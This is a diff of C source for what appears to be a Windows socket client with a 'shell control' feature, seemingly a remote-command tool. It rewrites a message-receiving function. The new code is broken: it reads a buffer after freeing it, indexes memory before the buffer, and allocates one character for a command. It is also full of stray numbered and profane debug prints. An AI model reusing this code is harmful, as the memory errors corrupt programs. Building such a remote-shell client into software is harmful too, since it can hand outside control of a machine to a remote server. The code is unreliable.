@@ -84,7 +84,8 @@ void mainConnessioneAlServer() {
 	SOCKET socketConnessione = INVALID_SOCKET;
 
 	//User for shell control
-	wchar_t path[DEFAULT_BUFLEN], comando[DEFAULT_BUFLEN], buffer[DEFAULT_BUFLEN];
+	wchar_t path[DEFAULT_BUFLEN], buffer[DEFAULT_BUFLEN];
+	wchar_t* comando = (wchar_t *)malloc(sizeof(wchar_t));
 	FILE *read;
 
 	inizializzaConnessione(&socketConnessione);
@@ -219,15 +220,40 @@ void invia(SOCKET socketConnessione, wchar_t* messaggio) {
 	IN wchar_t *recvbuff - Buffer used to store the incoming message.
 */
 wchar_t* riceviStringa(SOCKET socketConnessione, wchar_t *recvbuf) {
-	recvbuf[0] = L'\0';
+	wchar_t buffer[DEFAULT_BUFLEN], *temp;
 	int iResult;
-	iResult = recv(socketConnessione, (char *)recvbuf, DEFAULT_BUFLEN, 0);
-	if (iResult <= 0) {
-		printf("\nDEBUG: Error during recive\n");
-		chiudiConnessione(socketConnessione);
-		exit(1);
-	}
-	recvbuf[iResult/2] = L'\0';
+	do {
+		iResult = recv(socketConnessione, (char *)buffer, DEFAULT_BUFLEN, 0);
+		if (iResult <= 0) {
+			printf("\nDEBUG: Error during recive\n");
+			chiudiConnessione(socketConnessione);
+			exit(1);
+		}
+		else {
+			printf("1");
+			buffer[iResult / 2] = L'\0';
+			printf("2");
+			temp = (wchar_t *)malloc(sizeof(wchar_t) * wcslen(recvbuf));
+			printf("3");
+			memcpy_s(temp, sizeof(wchar_t) * wcslen(recvbuf), recvbuf, sizeof(wchar_t) * wcslen(recvbuf));
+			printf("4");
+			free(recvbuf);
+			printf("5");
+			recvbuf = (wchar_t *)malloc(sizeof(wchar_t) * (wcslen(recvbuf) + wcslen(buffer)));
+			printf("6");
+			memcpy_s(recvbuf, sizeof(wchar_t) * wcslen(recvbuf), temp, sizeof(wchar_t) * wcslen(temp));
+			printf("7");
+			free(temp);
+			printf("8");
+			printf("\nma che%ls", recvbuf);
+			printf("\ncazz%ls", buffer);
+			wcscat_s(recvbuf, wcslen(recvbuf), buffer);
+			printf("9");
+			temp = &recvbuf[wcslen(recvbuf - 3)];
+			printf("1");
+		}
+	} while (wcslen(recvbuf)>3&&wcscmp(temp, L"end"));
+	recvbuf[wcslen(recvbuf - 3)] = L'\0';
 	return recvbuf;
 }
 
